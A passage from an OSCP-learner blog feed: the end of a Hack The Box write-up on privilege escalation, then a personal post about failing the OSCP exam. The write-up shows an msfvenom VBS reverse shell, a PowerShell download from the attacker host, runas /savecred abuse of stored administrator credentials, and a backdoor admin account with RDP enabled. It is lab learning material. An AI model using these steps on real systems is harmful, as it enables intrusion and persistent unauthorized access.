bytes&lt;br /&gt;               2 Dir(s)  16,771,903,488 bytes free&lt;/pre&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;README_FIRST.txt&lt;br /&gt;&quot;Login:&quot; = &quot;sa&quot;&lt;br /&gt;&quot;Password:&quot; = &quot;htrcy@HXeryNJCTRHcnb45CJRY&quot;&lt;/pre&gt;
+
+&lt;p&gt;Looks like SQL db user &amp;amp; password&lt;/p&gt;
+
+&lt;p&gt;I checked to see if any saved creds. A lazy admin would save credentials using cmdkey. It creates, lists, and deletes stored user names and passwords or credentials.&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/creds.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-462&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/creds.png?w=774 774w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/creds.png?resize=300%2C79 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/creds.png?resize=768%2C201 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt; &amp;lt;figcaption&amp;gt;always noting the creds I capture&amp;lt;/figcaption&amp;gt;&amp;lt;/figure&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;So this admin seems to be quite lazy – including the password inside this file. I check to see if he has saved any credentials to the machine and bingo!&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\temp\scripts&amp;gt;cmdkey /list&lt;br /&gt;Currently stored credentials:&lt;br /&gt;&lt;code&gt;Target: Domain:interactive=ACCESS\Administrator                                                   Type: Domain PasswordUser: ACCESS\Administrator&lt;/code&gt;&lt;br /&gt;C:\temp\scripts&amp;gt;&lt;/pre&gt;
+
+&lt;p&gt;So the Administrator password is stored!&lt;/p&gt;
+
+&lt;p&gt;I wanted to upgrade to a proper shell as using Telnet is very difficult to use due to not being able to delete letters or press up on the keyboard to replay things in the buffer.&lt;/p&gt;
+
+&lt;p&gt;So know thing that .exes cant be run and that there are .vbs files in the scripts folder  – maybe the user can run .vbs files?&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.234 LPORT=443 --platform windows -a x64 -f vbs -o shell.vbs&lt;/pre&gt;
+
+&lt;p&gt;I created a .vbs file, downloaded it to the server and tried to run it but no luck – looks like .vbs files can only be run by the administrator.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://10.10.14.234/shell.vbs','C:\temp\scripts\shell.vbs')&quot;&lt;/pre&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\temp\scripts&amp;gt;shell.vbs&lt;br /&gt;Access is denied.&lt;br /&gt;C:\temp\scripts&amp;gt;&lt;/pre&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;For the vbs scripts: &lt;br /&gt;Go to windows Services and stop ALL SQL related services.&lt;br /&gt;Open command prompt with elevated privileges (Administrator).&lt;br /&gt;paste the following commands in command prompt for each script and click ENTER…&lt;br /&gt;1. cmd.exe /c WScript.exe &quot;c:\temp\scripts\SQLOpenFirewallPorts.vbs&quot; &quot;C:\Windows\system32&quot; &quot;c:\temp\logs\&quot;&lt;/pre&gt;
+
+&lt;p&gt;I need to use the runas command as it has a flag /savecreds which takes advantage of the administrator saved creds on the system.&lt;/p&gt;
+
+&lt;p&gt;So following the guide in the README_FIRST.txt I created this runas command with a nc listener on port 443.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;runas /user:Administrator /noprofile /savecred &quot;cmd.exe /c WScript.exe &quot;c:\temp\scripts\shell.vbs&quot;&quot;&lt;/pre&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;[root:~/htb]# nc -lnvp 443&lt;br /&gt;listening on [any] 443 …&lt;br /&gt;connect to [10.10.14.234] from (UNKNOWN) [10.10.10.98] 49158&lt;br /&gt;Microsoft Windows [Version 6.1.7600]&lt;br /&gt;Copyright (c) 2009 Microsoft Corporation.  All rights reserved.&lt;br /&gt;C:\Windows\system32&amp;gt;type c:\users\administrator\desktop\root.txt&lt;br /&gt;type c:\users\administrator\desktop\root.txt&lt;br /&gt;Access is denied.&lt;br /&gt;C:\Windows\system32&amp;gt;whoami&lt;br /&gt;whoami&lt;br /&gt;access\administrator&lt;br /&gt;C:\Windows\system32&amp;gt;&lt;/pre&gt;
+
+&lt;p&gt;So I got connected but strangely I could not read the root.txt file even though I’m logged in as administrator. I always find it easier to work with remote desktop. I know its very noisy but for this final bit its worth it.&lt;/p&gt;
+
+&lt;p&gt;I created a new user called test with password TotallySec123&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\Users\Administrator\Desktop&amp;gt;net user test TotallySec123 /add&lt;br /&gt;net user test TotallySec123 /add&lt;br /&gt;The command completed successfully.&lt;br /&gt;C:\Users\Administrator\Desktop&amp;gt;net localgroup administrators test /add&lt;br /&gt;net localgroup administrators test /add&lt;br /&gt;The command completed successfully.&lt;/pre&gt;
+
+&lt;p&gt;To enable remote desktop I ran the following as Administrator:&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;br&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0&lt;br /&gt;netsh firewall set service remoteadmin enable&lt;br /&gt;netsh firewall set service remotedesktop enable&lt;/pre&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rdesktop.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-464&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rdesktop.png?w=536 536w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rdesktop.png?resize=300%2C214 300w&quot; sizes=&quot;(max-width: 536px) 100vw, 536px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;figcaption&gt;logged on as test with password TotallySec123&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rootfile.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-465&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rootfile.png?w=747 747w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/rootfile.png?resize=300%2C113 300w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;root.txt file is green&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/encrpyted.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-467&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/encrpyted.png?w=412 412w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/encrpyted.png?resize=252%2C300 252w&quot; sizes=&quot;(max-width: 412px) 100vw, 412px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;the file is encrypted&amp;nbsp;&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;It looks like the contexts can be indexed.&lt;/p&gt;
+
+&lt;p&gt;I uploaded a meterpreter shell to priv esc to nt authority\system to see if could view the contents of the file but unfortunately I couldn’t.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\Users\Administrator\Desktop&amp;gt;whoami&lt;br /&gt;whoami&lt;br /&gt;nt authority\system&lt;br /&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt&lt;br /&gt;type root.txt&lt;br /&gt;Access is denied.&lt;br /&gt;C:\Users\Administrator\Desktop&amp;gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried to use powershell to view the contents.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\Users\Administrator\Desktop&amp;gt;powershell -nologo &quot;&amp;amp; &quot;Get-Content root.txt&quot;&lt;br /&gt;Get-Content : Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.&lt;br /&gt;&lt;/pre&gt;
+
+&lt;p&gt;I’m really not sure whats going on here. Hopefully some one can enlighten me. I managed to get root by changing the administrator password, enabling Remote Desktop logging in, running the ZkAccess program, exiting Remote Desktop then viewing the text file as below:&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt&lt;br /&gt;
+type root.txt&lt;br /&gt;
+6e1586cc7ab230a8d297e8f933d904cf&lt;br /&gt;
+C:\Users\Administrator\Desktop&amp;gt;&lt;/pre&gt;</content><author><name>rowbot</name></author><summary type="html">A very fun and frustrating box - learned a lot with it.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://0.0.0.0:4000/wp-content/uploads/2018/11/Screenshot-from-2018-12-06-14-42-16.png" /></entry><entry><title type="html">OSCP Journey Part 12</title><link href="http://0.0.0.0:4000/2018/09/13/oscp-part-12/" rel="alternate" type="text/html" title="OSCP Journey Part 12" /><published>2018-09-13T15:29:58+00:00</published><updated>2018-09-13T15:29:58+00:00</updated><id>http://0.0.0.0:4000/2018/09/13/oscp-part-12</id><content type="html" xml:base="http://0.0.0.0:4000/2018/09/13/oscp-part-12/">&lt;pre class=&quot;wp-block-preformatted&quot;&gt;Day: +1
+PDF: 100
+Videos: 100%
+Boxes: 14
+Networks:1&lt;/pre&gt;
+
+&lt;p&gt;Well I’ve just finished the exam and unsurprisingly I’ve failed. I didn’t exploit a single box. &lt;/p&gt;
+
+&lt;p&gt;Now for the excuses:&lt;/p&gt;
+
+&lt;p&gt;The main one is my lack of knowledge – simply down to the fact that I needed to put in more time that I could. Now no doubt some people would be able to pass with the time I put in but not me – thus the title of this site, I’m very much a newb. &lt;/p&gt;
+
+&lt;p&gt;I was working late on the labs two nights before the exam, the night before I got to bed at a reasonable time but got essentially no sleep. A random event occured, cows from two fields across broke into my garden and wrecked the place! I tried to chase them but they were having none of it. I was equiped to deal with dirty cow exploits but not real cows! Then during my exam I had to find out who owned them and then had the farmers coming round and trying not to accept blame and not wanting to pay for damages. I now have a “garden” full of crap and piss! Looks like the BBQ this weekend is cancelled.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/09/image0.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-409&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/09/image0.png?w=1334 1334w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/09/image0.png?resize=300%2C169 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/09/image0.png?resize=768%2C432 768w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/09/image0.png?resize=1024%2C576 1024w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;&lt;em&gt;Dirty COW exploiting me&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;With all that going on perhaps my mind wasn’t in the right place. Saying that I have to be realistic – I would not have passed anyway, but I’d like to think I would have got into a box or two.&lt;/p&gt;
+
+&lt;p&gt;This attempt allowed me to get experience of the exam so when I’m in a position to pass (knowledge wise) I will know what to expect. &lt;/p&gt;
+
+&lt;p&gt;I had made a plan which I stuck to and it made me feel as if I had quite a lot of time and good amount of breaks. &lt;a href=&quot;https://1drv.ms/x/s!AoBJLD90xdyFg6pJr88YtfR-Q5XjMQ&quot;&gt;OSCP exam plan&lt;/a&gt;. Let me know if you use it any find it useful.&lt;/p&gt;
+
+&lt;p&gt;So my exam was a proctored exam and I found it fine on average, about 15 minutes before your starting time you connect to:&lt;br /&gt;
+&lt;a href=&quot;https://screenconnect.offensive-security.com:8040/&quot;&gt;https://screenconnect.offensive-security.com:8040/&lt;/a&gt;&lt;br /&gt;
+to share your screen&lt;br /&gt;
+&lt;a href=&quot;https://webcam.offensive-security.com/&quot;&gt;https://webcam.offensive-security.com/&lt;/a&gt;&lt;br /&gt;
+to view you and do a room scan&lt;br /&gt;
+You also have to show your ID and compare that to your face.&lt;/p&gt;
+
+&lt;p&gt;The only issue I had was I bought a webcam from Amazon Logitech C270 HD Webcam and it was terrible at viewing text – I spent about 30 minutes trying to get it to focus on my ID. In the end I had to get my laptop and use its webcam to focus on it. Make sure you test this before your exam.&lt;/p&gt;
+
+&lt;p&gt;What’s next?&lt;br /&gt;
+When I first purchased lab access I paid for two 3 month access. So before I start my second stint in the labs I’m gonna take a break for a month maybe two. In slow time I’m going to go through and spruce up my exercises report format. &lt;/p&gt;
+
+&lt;p&gt;I’ll tackle a couple of hack the box machines and maybe a vulnhub machine.&lt;/p&gt;
+
+&lt;p&gt;If you have passed let me know your secret.&lt;/p&gt;
+
+&lt;p&gt;I will achieve this certification I don’t care how many resits it takes. &lt;/p&gt;</content><author><name>rowbot</name></author><summary type="html">Day: +1 PDF: 100 Videos: 100% Boxes: 14 Networks:1</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://0.0.0.0:4000/wp-content/uploads/2018/06/perfexion_logo.png" /></entry></feed>
